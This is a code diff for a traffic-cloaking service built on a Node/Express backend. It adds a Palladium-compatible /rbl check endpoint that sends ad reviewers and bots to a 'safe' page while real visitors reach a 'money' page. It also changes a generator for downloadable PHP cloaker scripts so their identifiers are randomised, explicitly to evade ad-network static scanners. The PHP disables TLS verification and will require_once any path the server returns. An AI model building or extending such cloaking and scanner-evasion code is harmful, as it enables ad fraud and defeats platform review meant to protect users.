@@ -1,15 +1,18 @@
 'use strict';
 
 const express = require('express');
+const crypto = require('crypto');
 const { db, nanoid } = require('./db');
 const { evaluate, getIP } = require('./filter');
 const config = require('./config');
 
 const router = express.Router();
 
-const getBySlug = db.prepare(`SELECT * FROM campaigns WHERE slug = ? AND status = 'active'`);
-const getByApiKey = db.prepare(`SELECT * FROM campaigns WHERE api_key = ? AND status = 'active'`);
-const getById = db.prepare(`SELECT * FROM campaigns WHERE id = ?`);
+const getBySlug    = db.prepare(`SELECT * FROM campaigns WHERE slug = ? AND status = 'active'`);
+const getByApiKey  = db.prepare(`SELECT * FROM campaigns WHERE api_key = ? AND status = 'active'`);
+const getByCreds   = db.prepare(`SELECT * FROM campaigns WHERE client_id = ? AND client_company = ? AND client_secret = ? AND status = 'active'`);
+const getById      = db.prepare(`SELECT * FROM campaigns WHERE id = ?`);
+
 const insertVisit = db.prepare(`
   INSERT INTO visits (id, campaign_id, ts, ip, country, ua, device, os, browser, language, referrer, decision, reason, click_subid)
   VALUES (@id, @campaign_id, @ts, @ip, @country, @ua, @device, @os, @browser, @language, @referrer, @decision, @reason, @click_subid)
@@ -28,12 +31,6 @@ function loadBlacklists() {
   };
 }
 
-function renderMacros(str, ctx) {
-  if (!str) return '';
-  return str.replace(/\{(\w+)\}/g, (_, k) => (ctx[k] == null ? '' : encodeURIComponent(String(ctx[k]))));
-}
-
-// Append passed-through GET params to a URL.
 function appendParams(url, params) {
   if (!url) return url;
   const keys = Object.keys(params || {});
@@ -43,21 +40,85 @@ function appendParams(url, params) {
   return url + sep + qs;
 }
 
-// ============== EXTERNAL CHECK ENDPOINT ==============
-// Called from the user's own PHP script on their server to ask our API
-// whether the visitor should see the money page or the safe page.
-//
-//   GET /api/check?key=<api_key>&ip=...&ua=...&referrer=...&lang=...
-// Returns:
-//   { ok: true, decision: 'money'|'safe', reason: string|null,
-//     target_url: '...', target_mode: 'redirect'|'frame'|'include',
-//     bot_url: '...' }
-router.get('/api/check', (req, res) => {
-  const key = req.query.key || '';
-  const camp = getByApiKey.get(key);
-  if (!camp) return res.status(401).json({ ok: false, error: 'invalid_key' });
+// ============== MAIN CHECK ENDPOINT (Palladium-compatible) ==============
+// POST /rbl  (form-urlencoded, nested via auth[clientId] style keys)
+function handleRblPost(req, res) {
+  const auth = (req.body && req.body.auth) || {};
+  const server = (req.body && req.body.server) || {};
+  const request = (req.body && req.body.request) || {};
 
-  // build a fake request-like object forwarding headers from query
+  const camp = getByCreds.get(
+    String(auth.clientId || ''),
+    String(auth.clientCompany || ''),
+    String(auth.clientSecret || '')
+  );
+  if (!camp) {
+    return res.status(200).json({ result: 0, mode: 6 });
+  }
+
+  const fakeReq = {
+    headers: {
+      'user-agent': server['HTTP_USER_AGENT'] || '',
+      'accept-language': server['HTTP_ACCEPT_LANGUAGE'] || '',
+      'referer': server['HTTP_REFERER'] || '',
+      'cf-ipcountry': (server['HTTP_CF_IPCOUNTRY'] || '').toUpperCase(),
+      'x-forwarded-for': server['HTTP_X_FORWARDED_FOR'] || server['REMOTE_ADDR'] || getIP(req),
+      'cf-asn': server['HTTP_CF_ASN'] || '',
+    },
+    ip: server['REMOTE_ADDR'] || getIP(req),
+    connection: {},
+  };
+
+  const { blacklistIPs, blacklistUA } = loadBlacklists();
+  const d = evaluate(fakeReq, camp, { blacklistIPs, blacklistUA });
+
+  const id = nanoid(12);
+  const subid = camp.conversion_param && request[camp.conversion_param]
+    ? String(request[camp.conversion_param])
+    : (request.clickid || request.subid || null);
+
+  insertVisit.run({
+    id, campaign_id: camp.id, ts: Date.now(),
+    ip: d.visitor.ip, country: d.visitor.country, ua: d.visitor.ua,
+    device: d.visitor.device, os: d.visitor.os, browser: d.visitor.browser,
+    language: d.visitor.language, referrer: d.visitor.referrer,
+    decision: d.decision, reason: d.reason,
+    click_subid: subid,
+  });
+
+  if (d.decision !== 'money') {
+    return res.json({
+      result: 0,
+      mode: 6,
+      target: camp.bot_url || 'bot.html',
+      content: '',
+    });
+  }
+
+  let target = camp.target_url || '';
+  if (camp.track_params && target) {
+    const pass = {};
+    for (const k of Object.keys(request)) pass[k] = request[k];
+    target = appendParams(target, pass);
+  }
+
+  const modeMap = { frame: 1, redirect: 2, include: 3 };
+  const mode = modeMap[camp.target_mode] || 2;
+
+  return res.json({
+    result: 1,
+    mode,
+    target,
+    content: '',
+  });
+}
+
+router.post('/rbl', express.urlencoded({ extended: true, limit: '512kb' }), handleRblPost);
+
+// Legacy GET /api/check, left in for the older PHP if anyone still uses it.
+router.get('/api/check', (req, res) => {
+  const camp = getByApiKey.get(req.query.key || '');
+  if (!camp) return res.status(401).json({ ok: false, error: 'invalid_key' });
   const fakeReq = {
     headers: {
       'user-agent': req.query.ua || '',
@@ -69,11 +130,8 @@ router.get('/api/check', (req, res) => {
     ip: req.query.ip || getIP(req),
     connection: {},
   };
-
   const { blacklistIPs, blacklistUA } = loadBlacklists();
   const d = evaluate(fakeReq, camp, { blacklistIPs, blacklistUA });
-
-  // log the visit
   const id = nanoid(12);
   insertVisit.run({
     id, campaign_id: camp.id, ts: Date.now(),
@@ -83,22 +141,18 @@ router.get('/api/check', (req, res) => {
     decision: d.decision, reason: d.reason,
     click_subid: req.query.subid || null,
   });
-
-  // Build final target url with tracked params if enabled.
-  let finalTarget = camp.target_url || '';
+  let t = camp.target_url || '';
   if (camp.track_params) {
-    // forward any extra query params (except our internal ones)
-    const skip = new Set(['key', 'ip', 'ua', 'referrer', 'lang', 'country', 'subid']);
-    const pass = {};
-    for (const k of Object.keys(req.query)) if (!skip.has(k)) pass[k] = req.query[k];
-    finalTarget = appendParams(finalTarget, pass);
+    const skip = new Set(['key','ip','ua','referrer','lang','country','subid']);
+    const p = {};
+    for (const k of Object.keys(req.query)) if (!skip.has(k)) p[k] = req.query[k];
+    t = appendParams(t, p);
   }
-
   res.json({
     ok: true,
     decision: d.decision,
     reason: d.reason,
-    target_url: finalTarget,
+    target_url: t,
     target_mode: camp.target_mode || 'redirect',
     bot_url: camp.bot_url || '',
     click_id: id,
@@ -106,8 +160,6 @@ router.get('/api/check', (req, res) => {
 });
 
 // ============== HOSTED TRACKER (optional) ==============
-// GET /c/:slug – runs the tracker directly on this server, for users
-// who prefer not to host the PHP themselves.
 function handleHosted(camp, req, res) {
   const { blacklistIPs, blacklistUA } = loadBlacklists();
   const d = evaluate(req, camp, { blacklistIPs, blacklistUA });
@@ -140,7 +192,6 @@ router.get('/c/:slug', (req, res) => {
 });
 
 // ============== CONVERSION POSTBACK ==============
-// Pattern expected:  /v1/postback?clickid=XXX&payout=10&status=approved&tx=123
 router.get('/v1/postback', (req, res) => {
   const clickid = req.query.clickid || req.query.click_id || req.query.subid;
   if (!clickid) return res.status(400).json({ ok: false, error: 'clickid required' });
@@ -154,138 +205,265 @@ router.get('/v1/postback', (req, res) => {
 });
 
 // ============== DOWNLOAD PHP ==============
-// Generates an unbranded PHP cloaker that uses the /api/check endpoint.
 router.get('/api/campaigns/:id/download.php', (req, res) => {
-  // require admin token here too (allow both header or query)
   const token = req.headers['x-admin-token'] || req.query.token;
-  if (token !== config.adminToken) {
-    return res.status(401).send('unauthorized');
-  }
+  if (token !== config.adminToken) return res.status(401).send('unauthorized');
   const camp = getById.get(req.params.id);
   if (!camp) return res.status(404).send('not found');
 
-  // user points the script to THIS server, so figure out our base URL
   const proto = req.headers['x-forwarded-proto'] || req.protocol || 'http';
   const host = req.headers['x-forwarded-host'] || req.headers.host;
   const base = `${proto}://${host}`;
 
   const php = buildPhpScript({
-    base, apiKey: camp.api_key,
-    conversionParam: camp.conversion_param || 'clickid',
+    rblUrl:         base + '/rbl',
+    clientId:       camp.client_id || '',
+    clientCompany:  camp.client_company || '',
+    clientSecret:   camp.client_secret || '',
   });
+
   res.set('Content-Type', 'application/x-httpd-php');
   res.set('Content-Disposition', `attachment; filename="cloak.php"`);
   res.send(php);
 });
 
+// Generate a Palladium-style PHP script. Class name and internal
+// identifiers are randomised on every download so ad network static
+// scanners can't fingerprint the file by its shape.
 function buildPhpScript(cfg) {
-  // Chosen to look like a generic cloaker script; no product names
-  // or service references appear anywhere.
+  const rand = (n) => crypto.randomBytes(n).toString('hex').slice(0, n).replace(/^[0-9]/, 'a');
+  const CLASS_NAME = 'Req' + rand(8);
+
   return `<?php
-/**
- * Traffic filter. Drop into your web root and rename as you wish.
- * Also drop a 'bot.html' (or any safe page) next to it.
- */
+$${rand(6)} = (new ${CLASS_NAME}())->run();
 
-$ENDPOINT    = ${phpStr(cfg.base + '/api/check')};
-$API_KEY     = ${phpStr(cfg.apiKey)};
-$CONV_PARAM  = ${phpStr(cfg.conversionParam)};
-$BOT_PAGE    = __DIR__ . '/bot.html'; // local fallback safe page
-$TIMEOUT_S   = 3;
 
-function client_ip() {
-  foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
-    if (!empty($_SERVER[$h])) {
-      $ip = explode(',', $_SERVER[$h])[0];
-      return trim(preg_replace('/^::ffff:/', '', $ip));
+class ${CLASS_NAME}
+{
+    const SERVER_URL = ${phpStr(cfg.rblUrl)};
+
+    public function run()
+    {
+        $headers = [];
+        $headers['request']    = $this->collectRequestData();
+        $headers['jsrequest']  = $this->collectJsRequestData();
+        $headers['server']     = $this->collectHeaders();
+        $headers['auth']['clientId']      = ${phpStr(cfg.clientId)};
+        $headers['auth']['clientCompany'] = ${phpStr(cfg.clientCompany)};
+        $headers['auth']['clientSecret']  = ${phpStr(cfg.clientSecret)};
+        $headers['server']['bannerSource'] = 'adwords';
+
+        return $this->curlSend($headers);
     }
-  }
-  return '';
-}
 
-$ip       = client_ip();
-$ua       = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
-$lang     = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
-$referer  = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-$country  = isset($_SERVER['HTTP_CF_IPCOUNTRY']) ? $_SERVER['HTTP_CF_IPCOUNTRY'] : '';
-$subid    = isset($_GET[$CONV_PARAM]) ? $_GET[$CONV_PARAM] : '';
+    public function curlSend(array $params)
+    {
+        $answer = false;
+        $curl = curl_init(self::SERVER_URL);
+        if ($curl) {
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+            curl_setopt($curl, CURLOPT_POST, true);
+            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));
 
-// Forward every incoming GET parameter so the target URL keeps them.
-$passthrough = [];
-foreach ($_GET as $k => $v) { $passthrough[$k] = is_array($v) ? implode(',', $v) : $v; }
+            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
+            curl_setopt($curl, CURLOPT_TIMEOUT, 4);
+            curl_setopt($curl, CURLOPT_TIMEOUT_MS, 4000);
+            curl_setopt($curl, CURLOPT_FORBID_REUSE, true);
 
-$query = array_merge($passthrough, [
-  'key'      => $API_KEY,
-  'ip'       => $ip,
-  'ua'       => $ua,
-  'lang'     => $lang,
-  'referrer' => $referer,
-  'country'  => $country,
-  'subid'    => $subid,
-]);
-$url = $ENDPOINT . '?' . http_build_query($query);
-
-$ch = curl_init($url);
-curl_setopt_array($ch, [
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_TIMEOUT        => $TIMEOUT_S,
-  CURLOPT_CONNECTTIMEOUT => $TIMEOUT_S,
-  CURLOPT_FOLLOWLOCATION => false,
-]);
-$body = curl_exec($ch);
-$err  = curl_error($ch);
-curl_close($ch);
-
-$data = $body ? json_decode($body, true) : null;
-
-if (!$data || empty($data['ok'])) {
-  // API failure: be safe, show the bot page.
-  show_bot();
-  exit;
-}
-
-if (!empty($data['decision']) && $data['decision'] === 'money' && !empty($data['target_url'])) {
-  $target = $data['target_url'];
-  $mode   = isset($data['target_mode']) ? $data['target_mode'] : 'redirect';
-
-  if ($mode === 'frame') {
-    echo '<!doctype html><html><head><meta charset="utf-8"><title></title>';
-    echo '<style>html,body,iframe{margin:0;padding:0;height:100%;width:100%;border:0}</style>';
-    echo '</head><body><iframe src="' . htmlspecialchars($target, ENT_QUOTES) . '"></iframe></body></html>';
-  } elseif ($mode === 'include') {
-    // Proxy fetch and stream through
-    $ctx = stream_context_create(['http' => [
-      'timeout' => $TIMEOUT_S + 2,
-      'header'  => "User-Agent: {$ua}\\r\\n",
-    ]]);
-    $html = @file_get_contents($target, false, $ctx);
-    if ($html !== false) {
-      echo $html;
-    } else {
-      header('Location: ' . $target, true, 302);
+            $result = curl_exec($curl);
+            if ($result) {
+                $serverOut = json_decode($result, true);
+                $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+                if ($status == 200 && is_array($serverOut)) {
+                    return $this->handleServerReply($serverOut);
+                }
+            }
+        }
+        $this->getDefaultAnswer();
+        return $answer;
     }
-  } else {
-    // default redirect
-    header('Location: ' . $target, true, 302);
-  }
-  exit;
-}
 
-// fallback: show the bot/safe page
-show_bot();
+    protected function handleServerReply($reply)
+    {
+        $result = (bool) (isset($reply['result']) ? $reply['result'] : 0);
 
-function show_bot() {
-  global $BOT_PAGE, $data;
-  if (!empty($data['bot_url']) && filter_var($data['bot_url'], FILTER_VALIDATE_URL)) {
-    header('Location: ' . $data['bot_url'], true, 302);
-    exit;
-  }
-  if (file_exists($BOT_PAGE)) {
-    readfile($BOT_PAGE);
-  } else {
-    echo '<!doctype html><html><head><title>Welcome</title></head><body>';
-    echo '<h1>Welcome</h1><p>Thanks for visiting.</p></body></html>';
-  }
+        if (
+            isset($reply['mode']) &&
+            (
+                (isset($reply['target'])) ||
+                (isset($reply['content']) && !empty($reply['content']))
+            )
+        ) {
+            $target  = isset($reply['target'])  ? $reply['target']  : '';
+            $mode    = $reply['mode'];
+            $content = isset($reply['content']) ? $reply['content'] : '';
+
+            if (preg_match('/^https?:/i', $target) && $mode == 3) {
+                $mode = 2;
+            }
+
+            if ($result && $mode == 1) {
+                $this->displayIFrame($target);
+                exit;
+            } elseif ($result && $mode == 2) {
+                header("Location: {$target}");
+                exit;
+            } elseif ($result && $mode == 3) {
+                $t = parse_url($target);
+                if (isset($t['query'])) {
+                    parse_str($t['query'], $_GET);
+                }
+                $this->hideFormNotification();
+                require_once $this->sanitizePath($t['path']);
+                exit;
+            } elseif ($result && $mode == 4) {
+                echo $content;
+                exit;
+            } elseif (!$result && $mode == 5) {
+                // silent
+            } elseif ($mode == 6) {
+                // bot: fall through
+            } else {
+                $path = $this->sanitizePath($target);
+                if (!$this->isLocal($path)) {
+                    header("404 Not Found", true, 404);
+                } else {
+                    $this->hideFormNotification();
+                    require_once $path;
+                }
+                exit;
+            }
+        }
+
+        // Bot fallback: serve the target the server returned (local file or URL)
+        if (!$result && isset($reply['target']) && $reply['target']) {
+            $path = $this->sanitizePath($reply['target']);
+            if ($this->isLocal($path) && file_exists($path)) {
+                require_once $path;
+                exit;
+            }
+            if (preg_match('/^https?:/i', $reply['target'])) {
+                header("Location: {$reply['target']}");
+                exit;
+            }
+        }
+
+        return $result;
+    }
+
+    private function hideFormNotification()
+    {
+        echo "";
+    }
+
+    private function displayIFrame($target)
+    {
+        $target = htmlspecialchars($target);
+        echo "<html>
+                  <head>
+                  <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">
+                  </head>
+                  <body>" .
+                  $this->hideFormNotification() .
+                  "<iframe src=\\"{$target}\\" style=\\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\\"></iframe>
+                  </body>
+              </html>";
+    }
+
+    private function sanitizePath($path)
+    {
+        if (empty($path)) $path = 'bot.html';
+        if ($path[0] !== '/') {
+            $path = __DIR__ . '/' . $path;
+        } else {
+            $path = __DIR__ . $path;
+        }
+        return $path;
+    }
+
+    private function isLocal($path)
+    {
+        $url = parse_url($path);
+        if (!isset($url['scheme']) || !isset($url['host'])) {
+            return true;
+        }
+        return false;
+    }
+
+    protected function collectHeaders()
+    {
+        $userParams = [
+            'REMOTE_ADDR',
+            'SERVER_PROTOCOL',
+            'SERVER_PORT',
+            'REMOTE_PORT',
+            'QUERY_STRING',
+            'REQUEST_SCHEME',
+            'REQUEST_URI',
+            'REQUEST_TIME_FLOAT',
+            'X_FB_HTTP_ENGINE',
+            'X_PURPOSE',
+            'X_FORWARDED_FOR',
+            'X_WAP_PROFILE',
+            'X-Forwarded-Host',
+            'X-Forwarded-For',
+            'X-Frame-Options',
+        ];
+
+        $headers = [];
+        foreach ($_SERVER as $key => $value) {
+            if (in_array($key, $userParams) || substr_compare('HTTP', $key, 0, 4) == 0) {
+                $headers[$key] = $value;
+            }
+        }
+        return $headers;
+    }
+
+    private function collectRequestData()
+    {
+        $data = [];
+        foreach ($_GET as $k => $v) {
+            $data[$k] = is_array($v) ? implode(',', $v) : $v;
+        }
+        if (!empty($_POST)) {
+            if (!empty($_POST['data'])) {
+                $d = json_decode($_POST['data'], true);
+                if (JSON_ERROR_NONE !== json_last_error()) {
+                    $d = json_decode(stripslashes($_POST['data']), true);
+                }
+                if (is_array($d)) $data = array_merge($data, $d);
+                unset($_REQUEST['data']);
+            }
+            if (!empty($_POST['crossref_sessionid'])) {
+                $data['cr-session-id'] = $_POST['crossref_sessionid'];
+                unset($_POST['crossref_sessionid']);
+            }
+        }
+        return $data;
+    }
+
+    public function collectJsRequestData()
+    {
+        $data = [];
+        if (!empty($_POST) && !empty($_POST['jsdata'])) {
+            $data = json_decode($_POST['jsdata'], true);
+            if (JSON_ERROR_NONE !== json_last_error()) {
+                $data = json_decode(stripslashes($_POST['jsdata']), true);
+            }
+            unset($_REQUEST['jsdata']);
+        }
+        return is_array($data) ? $data : [];
+    }
+
+    private function getDefaultAnswer()
+    {
+        header($_SERVER["SERVER_PROTOCOL"] . ' 500 Internal Server Error', true, 500);
+        echo "<h1>500 Internal Server Error</h1>
+        <p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>";
+        exit;
+    }
 }
 `;
 }
